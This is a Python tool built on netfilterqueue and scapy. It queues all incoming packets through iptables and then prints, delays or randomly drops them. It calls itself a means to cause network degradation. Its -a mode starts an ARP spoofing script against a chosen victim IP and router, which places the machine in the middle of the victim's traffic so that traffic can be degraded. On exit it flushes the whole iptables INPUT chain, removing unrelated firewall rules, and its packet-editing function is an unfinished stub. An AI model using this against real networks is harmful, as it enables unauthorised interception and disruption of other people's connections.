import argparse
import signal
from netfilterqueue import NetfilterQueue
from scapy.all import *


def print_force(str):
    """This method is required because when this python file is called as a script
    the prints don't appear and a flush is required """

    print(str)
    sys.stdout.flush()


def affect_packet(packet):
    """This function checks if the packet should be affected or not"""

    if target_packet_type == "ALL":
        return True
    else:
        # Grabs the first section of the Packet
        packet_string = str(packet)
        split = packet_string.split(' ')

        # Checks for the target packet type
        if target_packet_type == split[0]:
            return True
        else:
            return False


def ignore_packet(packet):
    """This is just used a default 'do nothing' function """

    # Accepts and lets the packet leave the queue
    packet.accept()


def print_packet(packet):
    """This function just prints the packet"""

    if affect_packet(packet):
        print_force("[!] " + str(packet))

    # Accepts and lets the packet leave the queue
    packet.accept()


def edit_packet(packet):
    """This function will be used to edit sections of a packet, this is currently incomplete"""

    if affect_packet(packet):
        # Converts into Scapy compatible string
        pkt = IP(packet.get_payload())

        # TODO: Packet editing here

        # Sets the packet to the modified version
        packet.set_payload(bytes(pkt))

    # Accepts and lets the packet leave the queue
    packet.accept()


def packet_latency(packet):
    """This function is used to incur latency on packets"""

    if affect_packet(packet):
        # Shows the packet
        print_force("[!] " + str(packet))

        # Issues latency of the entered value
        time.sleep(latency_value_second)

    # Accepts and lets the packet leave the queue
    packet.accept()


def packet_loss(packet):
    """This function will issue a packet loss,
    a percentage is defined and anything
    lower is dropped and anything else is accepted"""

    if affect_packet(packet):
        # random value from 1 to 100
        random_value = random.uniform(1, 100)

        # If the generated value is smaller than the percentage discard
        if packet_loss_percentage > random_value:
            packet.drop()
            print_force("[!] Packet dropped!")
        # Accept the packet
        else:
            packet.accept()
    # This else is needed because the packet would be blocked if it's not the target
    else:
        packet.accept()


def run_packet_manipulation():
    """The main method here, will issue a iptables command and construct the NFQUEUE"""

    try:
        global nfqueue
        global arp_process

        # Runs the IPTABLES command
        os.system("iptables -A INPUT -j NFQUEUE")

        print_force("[*] Mode is: " + mode.__name__)

        # Setup for the NQUEUE
        nfqueue = NetfilterQueue()

        try:
            nfqueue.bind(0, mode)  # 0 is the default NFQUEUE
        except OSError:
            print_force("[!] Queue already created")

        # Runs the arp spoofing
        if arp_active:
            cmd = f'python ArpSpoofing.py -t {victim_ip} -r {router_ip} -i {interface}'
            arp_process = subprocess.Popen(cmd, shell=True)

        # Shows the start waiting message
        print_force("[*] Waiting ")
        nfqueue.run()

    except KeyboardInterrupt:
        clean_close('', '')


def parameters():
    """This function deals with parameters passed to the script
    most of the handling is performed by the 'getopt' module"""

    # Defines globals to be used above
    global mode
    global latency_value_second
    global packet_loss_percentage
    global target_packet_type

    global victim_ip
    global router_ip
    global interface
    global arp_active

    # Defaults
    mode = ignore_packet
    target_packet_type = 'ALL'
    arp_active = False

    # Arguments
    parser = argparse.ArgumentParser(prog="Packet.py", description="Run this script to cause network degradation")
    parser.add_argument('-p', action='store_true', help="Sets the mode to print_packet")
    parser.add_argument('-l', action='store', help="Sets the mode to packet_latency", metavar='time(ms)')
    parser.add_argument('-z', action='store', help="Sets the mode to packet_loss", metavar='loss_percent')
    parser.add_argument('-t', action='store', help="Specifies a packet type to affect", metavar='packet_name')
    parser.add_argument('-a', action='store', nargs=3, help="Specifies values for arp spoofing mode",
                        metavar=('victimIP', 'routerIP', 'interface'))
    args = parser.parse_args()

    # Modes
    if args.p:
        mode = print_packet

    elif args.l:
        print_force('[*] Latency set to: ' + args.l + 'ms')
        mode = packet_latency
        latency_value_second = int(args.l) / 1000

    elif args.z:
        print_force('[*] Packet loss set to: ' + args.z + '%')
        mode = packet_loss
        packet_loss_percentage = int(args.z)

    # Extra settings
    if args.t:
        print_force("[!] Only affecting " + args.t + " packets")
        target_packet_type = args.t

    if args.a:
        print_force("[!] Arp spoofing mode activated")
        arp_active = True
        victim_ip = args.a[0]
        router_ip = args.a[1]
        interface = args.a[2]

    # When all parameters are handled
    run_packet_manipulation()


def clean_close(signum, frame):
    """Used to close the script cleanly"""

    if arp_active:
        arp_process.send_signal(signal.SIGINT)

    print("\n[!] Process aborted")
    print("[!] iptables reverted")
    os.system("iptables -F INPUT")


# Rebinds the all the close signals to clean_close the script
signal.signal(signal.SIGTSTP, clean_close)  # Ctrl+Z
signal.signal(signal.SIGQUIT, clean_close)  # Ctrl+\

# Check if user is root
if os.getuid() != 0:
    exit("Error: User needs to be root to run this script")

parameters()
